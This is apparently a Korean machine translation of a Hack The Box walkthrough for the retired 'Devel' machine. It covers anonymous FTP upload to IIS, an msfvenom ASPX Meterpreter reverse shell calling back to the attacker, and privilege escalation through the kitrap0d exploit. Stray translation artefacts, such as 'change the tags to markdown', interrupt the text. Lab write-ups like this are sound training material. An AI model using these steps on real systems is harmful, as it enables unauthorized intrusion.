---
title: "Devel  Hack The Box 워크스루"
description: ""
coverImage: "/assets/img/2024-06-19-DevelHackTheBoxWalk-through_0.png"
date: 2024-06-19 01:18
ogImage: 
  url: /assets/img/2024-06-19-DevelHackTheBoxWalk-through_0.png
tag: Tech
originalTitle: "Devel — Hack The Box Walk-through"
link: "https://medium.com/@jaylinscorner/devel-hack-the-box-walkthrough-6a04f5f0b8a3"
---


안녕하세요!

오늘은 과거에 완료한 Hack The Box 머신인 Devel을 살펴보겠습니다. 이 머신은 Windows 머신에서의 지역 권한 상승을 강조합니다.

이 머신은 여전히 Hack The Box에서 이용 가능한 쉬운 난이도의 은퇴된 머신입니다. 이 글을 쓰는 시점에서는 불행히도 이 머신에 접근하려면 VIP 멤버십이 필요합니다. 제가 이 머신을 루팅했을 때는 무료였지만, 곧 다시 무료가 될 수도 있습니다.

더 이상 말 늑대, 시작해 봅시다!

<div class="content-ad"></div>

마크다운 형식으로 테이블 태그를 변경해주세요.

<div class="content-ad"></div>

우리가 포트 스캔 결과 익명 FTP 로그인이 허용되어 있음을 알려주었기 때문에 익명으로 FTP에 로그인을 시도해 볼 수 있습니다.

![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_2.png)

우리는 성공적으로 포트 21인 FTP에 익명으로 로그인했습니다. 현재 디렉토리에 있는 파일 목록을 볼 수 있습니다.

이 서버가 Microsoft IIS/7.5를 실행 중이기 때문에, ASP 및 ASPX 확장자를 가진 코드 실행을 허용하는 이 버전의 IIS에서 익명으로 파일을 업로드하는 시도를 해볼 수 있습니다.

<div class="content-ad"></div>


<img src="/assets/img/2024-06-19-DevelHackTheBoxWalk-through_3.png" />

랜덤 ASPX 파일을 업로드한 후 익명 사용자의 업로드 기능을 이용할 수 있다는 점을 알 수 있습니다.

ASPX 파일을 업로드할 수 있으므로 ASPX 역술을 생성해볼 수 있습니다.

터미널에서 Metasploit Payload Generator를 엽니다.


<div class="content-ad"></div>

```js
msfvenom
```

그런 다음, ASPX 역술 쉘을 만들려면 다음을 사용합니다:

```js
msfvenom -f aspx -p windows/meterpreter/reverse_tcp LHOST=(내_IP) LPORT=4444 -o moe.aspx
```

msfvenom을 사용하여 역술 쉘을 얻을 수 있는 올바른 페이로드를 생성하려고 합니다. 이 경우 Windows reverse_tcp 페이로드를 사용하고 있으며, 이는 Windows 상자이기 때문입니다. 선택한 옵션은 Meterpreter입니다.

<div class="content-ad"></div>

다음은 플래그입니다:

- -f: 출력 형식
- -p: 사용할 페이로드 (우리 시나리오에서는 Windows Reverse TCP)
- LHOST: 우리 자신입니다; 이 페이로드의 역쉘 수신 측에 있을 것입니다. 우리가 수신 대기 중인 IP를 입력하는 곳입니다 (eth0 또는 tun0)
- LPORT: 우리가 수신 대기할 포트, 보통 기본값으로 4444를 유지합니다
- -o: 서버에 업로드된 페이로드를 포함하는 출력 파일

이 파일을 업로드 시도하면 성공합니다. 이제 업로드한 파일과 상호 작용하기 위해 리스너를 구성합니다.

터미널에서 msfconsole을 실행하여 Metasploit으로 리스너를 구성합니다:

<div class="content-ad"></div>


msfconsole


그런 다음 사용할 exploit으로 이동하겠습니다.


use exploit/multi/handler 


그런 다음 옵션을 우리가 원하는 대로 구성합니다.

<div class="content-ad"></div>

해당 표식을 마크다운 형식으로 변경하시면 됩니다.

<div class="content-ad"></div>


```js
set payload windows/meterpreter/reverse_tcp
```

참고: 이번에는 세션 ID를 실행하기 전에 기억하는 것이 중요합니다. 나중에 사용할 것입니다.

이제 실행해 봅시다!! :

```js
run
```  


<div class="content-ad"></div>

우리는 브라우저에서 ASPX 역쉘 파일을 다음과 같이 로드합니다:

```js
10.10.10.5/{File_Name}
```

이제 터미널에서 호스트 OS 안에 있다는 것을 확인할 수 있습니다

<img src="/assets/img/2024-06-19-DevelHackTheBoxWalk-through_4.png" />

<div class="content-ad"></div>

이제 파일 시스템으로 이동해 보아야 합니다. 가능하면 C 드라이브로 이동하겠습니다.

그래서 다음과 같이 세션을 백그라운드로 설정합니다:

```js
background
```

그런 다음, 획득한 시스템에서 로컬 취약점을 찾기 위해 Metasploit을 다시 엽니다. msfconsole을 열고 exploit/multi/handler로 이동한 다음 post/multi/recon/local_exploit_suggester로 넘어갑니다.

<div class="content-ad"></div>

```js
use post/multi/recon/local_exploit_suggester
```

![Image 1](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_5.png)

이전에 메모한 세션 ID를 여기에 입력하겠습니다:

![Image 2](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_6.png)


<div class="content-ad"></div>

우리의 세션 ID를 구성한 후에 이를 실행할 거에요. 이 모듈은 Windows에서 로컬 악용을 찾을 거에요.

실행이 완료되면 Metasploit이 사용을 제안하는 것을 볼 수 있을 거에요:

```js
exploit/windows/local/ms10_015_kitrap0d
```

이 모듈은 Windows Machines에서 시스템 권한으로 새로운 세션을 만들 것이에요. 이 모듈은 CVE-2010–0232와 관련된 악용인데요, 이는 Microsoft Windows 커널 예외 처리기 취약점에 관련된 것이에요.

<div class="content-ad"></div>

우리는 옵션을 조정합니다...

맞죠!

```js
show options
```

들을 호스트를 설정해요. 그리고 우리의 리스닝 포트를 4445로 설정할 거에요; 다른 포트를 사용하여 exploit을 수행할 거예요. 마지막으로 세션을 리스너와 동일하게 만들 거에요.

<div class="content-ad"></div>

그럼 이제 실행해 봅시다!

![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_7.png)

우리의 Exploit이 완료된 것 같은데 성공했을까요?

Meterpreter에서 명령 셸을 사용합니다.

<div class="content-ad"></div>

접근 성공! 이제 cd ..를 사용하여 C 드라이브로 이동합니다.

![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_8.png)

C 드라이브의 내용을 분석하고 사용자 디렉토리가 흥미로울 수 있다는 것을 알 수 있었습니다. 해당 디렉터리로 이동하면 관리자 및 바비스와 같이 발견할 가치가 있는 2개의 사용자 디렉토리가 보입니다.

![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_9.png)

<div class="content-ad"></div>

해당 디렉터리로 이동하고 두 가지 모두 사용자 및 루트 권한을 얻어야 이 상자를 루팅할 수 있어요!

![이미지 1](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_10.png)

![이미지 2](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_11.png)

이것은 제 첫 번째 게시된 Hack The Box 워크스루입니다. 이 워크스루를 작성하는 것은 나에게 유용한 경험을 얻게 도와주고 동시에 다른 사람들이 학습하는 데 도움이 되기도 해요!

<div class="content-ad"></div>

도움이 되었다면 알려주세요. 또한 Linkedin에서 연락해도 괜찮습니다:

www.linkedin.com/in/jaylin-nelson

참고 문헌: